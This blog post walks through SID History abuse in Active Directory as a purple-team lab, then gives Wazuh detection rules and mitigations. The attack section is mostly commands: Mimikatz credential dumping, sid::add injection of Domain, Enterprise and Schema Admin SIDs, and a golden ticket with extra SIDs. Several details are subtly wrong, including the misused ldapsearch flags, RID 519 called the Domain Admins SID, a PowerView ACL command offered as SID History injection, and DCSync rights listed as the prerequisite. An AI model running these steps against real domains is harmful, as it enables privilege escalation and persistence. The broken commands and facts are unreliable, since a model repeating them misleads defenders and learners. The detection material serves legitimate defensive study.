---
title: SID History Abuse and Injection - MITRE ATT&CK T1134.005
date: 2025-01-25 13:00:00 
last_modified_at: 2025-01-25 13:00:00
categories: [Purple Team,Active Directory & Kerberos Abuse]
tags: [active directory,sid history,mitre att&ck,cybersecurity,penetration testing,purple team,domain controller,privilege escalation,persistence]     # TAG names should always be lowercase
comments: true
image:
  path: /./media/post7/sid_history.png
  alt: "SID History Abuse - Active Directory Privilege Escalation Technique"
author: Ahmed BAHYA
excerpt: "Learn about SID History abuse and injection (MITRE ATT&CK T1134.005), a sophisticated Active Directory privilege escalation technique. Complete walkthrough with detection and response strategies."
description: "Comprehensive guide to SID History abuse and injection (MITRE ATT&CK T1134.005). Learn how attackers abuse SID History attributes for privilege escalation, persistence, and cross-domain access in Active Directory environments."
keywords: [sid history, active directory, mitre att&ck, t1134.005, cybersecurity, penetration testing, purple team, domain controller, privilege escalation, persistence, cross-domain, golden ticket, mimikatz]
canonical_url: https://b2hu.me/posts/SID-History-Abuse-and-Injection
---

## What is SID History?

**SID History** is a special attribute in Active Directory that allows a user account to maintain access to resources in other domains or forests after being migrated. When a user account is moved from one domain to another, the SID History attribute preserves the original Security Identifier (SID) to maintain access to resources in the source domain.

### Understanding SIDs and SID History

A **Security Identifier (SID)** is a unique identifier assigned to every security principal (user, group, computer) in Active Directory. It consists of:

- **SID Prefix**: Identifies the domain (e.g., S-1-5-21-...)
- **Relative Identifier (RID)**: Unique number within the domain
- **SID History**: Additional SIDs from previous domains

The SID History attribute contains a list of SIDs that the account previously had, allowing it to maintain access to resources across domain boundaries.

## SID History Abuse Attack Vector

**SID History abuse** occurs when an attacker manipulates the SID History attribute to grant elevated privileges or access to resources in other domains. This technique is particularly dangerous because:

- **Privilege Escalation**: Adding high-privilege SIDs to a low-privilege account
- **Cross-Domain Access**: Gaining access to resources in other domains/forests
- **Persistence**: Maintaining access even after account changes
- **Stealth**: SID History modifications can be difficult to detect

### Attack Scenarios

1. **Golden Ticket with SID History**: Adding domain admin SIDs to a regular user
2. **Cross-Domain Persistence**: Maintaining access after domain migration
3. **Privilege Escalation**: Adding enterprise admin SIDs to a regular account
4. **Resource Access**: Gaining access to resources in other domains

## ATTACK Simulation (SID History Injection Demonstration)

In this practical demonstration, we'll simulate a **SID History injection** attack in our test environment and identify **key Indicators of Attack (IoAs)** that would alert defenders to such malicious activity.

**Lab Environment Details:**

- Source Domain: **corp.local**
- Target Domain: **acme.local**
- Attacker Account: **corp.local/attacker**
- Target Account: **acme.local/victim**
- Domain Controller: **acme.local/DC01**

### Prerequisites for SID History Abuse

To perform SID History injection, the attacker needs:

1. **Domain Admin privileges** in the target domain
2. **SID History modification rights** (DS-Replication-Get-Changes-All)
3. **Access to the target account** or ability to create new accounts

### Attack Methodology

#### Step 1: Enumeration and Reconnaissance

First, let's enumerate the target domain to understand the environment:

```shell
# Enumerate domain users and their SIDs
ldapsearch -H ldap://acme.local -u "acme.local\attacker" -p "Password123!" -b "dc=acme,dc=local" "(objectClass=user)" sAMAccountName objectSid

# Check current SID History for target account
ldapsearch -H ldap://acme.local -u "acme.local\attacker" -p "Password123!" -b "dc=acme,dc=local" "(sAMAccountName=victim)" sIDHistory
```

#### Step 2: SID History Injection

Using **Mimikatz** to inject SID History:

```shell
# Start Mimikatz with elevated privileges
mimikatz.exe

# Authenticate to the target domain
privilege::debug
sekurlsa::logonpasswords

# Inject SID History (adding Domain Admin SID)
sid::add /sam:victim /new:acme.local-519
```

Alternative method using **PowerView**:

```powershell
# Import PowerView
Import-Module PowerView.ps1

# Get the SID of the target account
Get-DomainUser -Identity victim | Select-Object samaccountname, objectsid

# Get the SID of the Domain Admins group
Get-DomainGroup -Identity "Domain Admins" | Select-Object samaccountname, objectsid

# Add SID History using PowerView
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity "Domain Admins" -Rights WriteProperty -PropertyName sIDHistory
```

#### Step 3: Verification

Verify the SID History injection was successful:

```shell
# Check the modified SID History
ldapsearch -H ldap://acme.local -u "acme.local\attacker" -p "Password123!" -b "dc=acme,dc=local" "(sAMAccountName=victim)" sIDHistory

# Test access to privileged resources
dir \\acme.local\admin$ /user:acme.local\victim
```

### Advanced SID History Techniques

#### Golden Ticket with SID History

Create a Golden Ticket that includes SID History for cross-domain access:

```shell
# Create Golden Ticket with SID History
mimikatz.exe
kerberos::golden /user:Administrator /domain:acme.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:hash /sids:S-1-5-21-0987654321-0987654321-0987654321-519 /ptt
```

#### Cross-Domain SID History Injection

Inject SIDs from a trusted domain:

```shell
# Add Enterprise Admin SID from parent domain
sid::add /sam:victim /new:enterprise.local-519

# Add Schema Admin SID
sid::add /sam:victim /new:acme.local-518
```

## Detection & Response Using Wazuh

Detecting SID History abuse requires monitoring several event types and understanding the attack patterns. Here's how to implement comprehensive detection using **Wazuh**:

### Event IDs to Monitor

1. **Event ID 4765**: SID History was added to an account
2. **Event ID 4766**: An attempt to add SID History failed
3. **Event ID 4728**: A member was added to a security-enabled global group
4. **Event ID 4624**: Successful logon (to detect privilege escalation)

### Wazuh Detection Rules

#### Rule 1: SID History Addition Detection

```xml
<group name="security_event, windows,">
  <rule id="110004" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4765$</field>
    <match name="win.eventdata.SubjectUserName" negate="yes">SYSTEM</match>
    <options>no_full_log</options>
    <description>Possible SID History injection detected. Account: $(win.eventdata.TargetUserName) by User: $(win.eventdata.SubjectUserName)</description>
    <mitre>
        <id>T1134.005</id>
    </mitre>
    <info type="link">https://attack.mitre.org/techniques/T1134/005/</info>
  </rule>
</group>
```

#### Rule 2: Failed SID History Addition

```xml
<group name="security_event, windows,">
  <rule id="110005" level="10">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4766$</field>
    <match name="win.eventdata.SubjectUserName" negate="yes">SYSTEM</match>
    <options>no_full_log</options>
    <description>Failed SID History addition attempt. Target: $(win.eventdata.TargetUserName) by User: $(win.eventdata.SubjectUserName)</description>
    <mitre>
        <id>T1134.005</id>
    </mitre>
  </rule>
</group>
```

#### Rule 3: Privilege Escalation via SID History

```xml
<group name="security_event, windows,">
  <rule id="110006" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.LogonType">^3$</field>
    <field name="win.eventdata.IpAddress" negate="yes">127.0.0.1</field>
    <match name="win.eventdata.LogonProcessName">Kerberos</match>
    <options>no_full_log</options>
    <description>Possible privilege escalation via SID History. User: $(win.eventdata.TargetUserName) from IP: $(win.eventdata.IpAddress)</description>
    <mitre>
        <id>T1134.005</id>
    </mitre>
  </rule>
</group>
```

### Custom Variables for Monitoring

Add these variables to your Wazuh configuration:

```xml
<!-- High-privilege SIDs to monitor -->
<var name="high_privilege_sids">S-1-5-21.*-500|S-1-5-21.*-512|S-1-5-21.*-518|S-1-5-21.*-519|S-1-5-21.*-520</var>

<!-- Trusted administrative accounts -->
<var name="trusted_admins">Administrator|admin|DomainAdmin|EnterpriseAdmin</var>
```

### Advanced Detection Rule

```xml
<group name="security_event, windows,">
  <rule id="110007" level="14">
    <if_sid>110004</if_sid>
    <field name="win.eventdata.SubjectUserName" type="pcre2">$trusted_admins</field>
    <field name="win.eventdata.NewSid" type="pcre2">$high_privilege_sids</field>
    <options>no_full_log</options>
    <description>CRITICAL: High-privilege SID History injection by trusted admin. Target: $(win.eventdata.TargetUserName) SID: $(win.eventdata.NewSid)</description>
    <mitre>
        <id>T1134.005</id>
    </mitre>
  </rule>
</group>
```

## Prevention and Mitigation Strategies

### 1. Access Control

- **Restrict SID History modifications** to authorized personnel only
- **Implement least privilege** for administrative accounts
- **Use Just-In-Time (JIT) access** for sensitive operations

### 2. Monitoring and Alerting

- **Monitor SID History changes** in real-time
- **Alert on suspicious privilege escalations**
- **Track cross-domain access patterns**

### 3. Security Hardening

- **Disable SID History** where not required
- **Implement SID filtering** between domains
- **Use Protected Users group** for sensitive accounts

### 4. Detection Tools

- **Wazuh SIEM** for real-time monitoring
- **BloodHound** for attack path analysis
- **PowerShell logging** for command execution tracking

## Conclusion

SID History abuse represents a sophisticated attack vector that can lead to significant privilege escalation and persistence in Active Directory environments. By understanding the attack methodology and implementing proper detection mechanisms, organizations can effectively defend against this technique.

Key takeaways:

1. **SID History abuse** allows attackers to gain elevated privileges and cross-domain access
2. **Detection requires monitoring** multiple event types and understanding attack patterns
3. **Wazuh provides comprehensive detection** capabilities for SID History attacks
4. **Prevention strategies** include access control, monitoring, and security hardening

The combination of proper monitoring, alerting, and access controls can significantly reduce the risk of SID History abuse while maintaining the legitimate functionality needed for domain migrations and cross-domain access.

---

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "TechArticle",
  "headline": "SID History Abuse and Injection - MITRE ATT&CK T1134.005",
  "description": "Comprehensive guide to SID History abuse and injection (MITRE ATT&CK T1134.005). Learn how attackers abuse SID History attributes for privilege escalation, persistence, and cross-domain access in Active Directory environments.",
  "image": "https://b2hu.me/media/post7/sid_history.png",
  "author": {
    "@type": "Person",
    "name": "Ahmed BAHYA",
    "url": "https://b2hu.me"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ThreatLenz",
    "logo": {
      "@type": "ImageObject",
      "url": "https://i.pinimg.com/236x/19/27/c0/1927c03f9e435636a71698616c4416fb.jpg"
    }
  },
  "datePublished": "2025-01-25T13:00:00+00:00",
  "dateModified": "2025-01-25T13:00:00+00:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b2hu.me/posts/SID-History-Abuse-and-Injection"
  },
  "keywords": "sid history, active directory, mitre att&ck, t1134.005, cybersecurity, penetration testing, purple team, domain controller, privilege escalation, persistence, cross-domain, golden ticket, mimikatz",
  "articleSection": "Purple Team",
  "inLanguage": "en-US"
}
</script> 